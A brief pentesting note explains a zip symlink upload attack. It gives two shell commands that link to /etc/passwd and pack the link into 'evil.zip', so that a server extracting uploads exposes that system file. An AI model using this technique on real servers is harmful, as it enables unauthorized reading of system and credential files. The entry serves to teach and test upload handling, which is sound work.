## Zip Symlink Attack
```
ln -s /etc/passwd link
zip --symlinks evil.zip link
```
This will create a link to /etc/passwd named link and compress the link in an archive. When this archive is uploaded to the server, the server will export the link that will point to the /etc/passwd in the server. If we can display the content of this decompressed file in any way, we can see the contents of the /etc/passwd

References
https://levelup.gitconnected.com/zip-based-exploits-zip-slip-and-zip-symlink-upload-21afd1da464f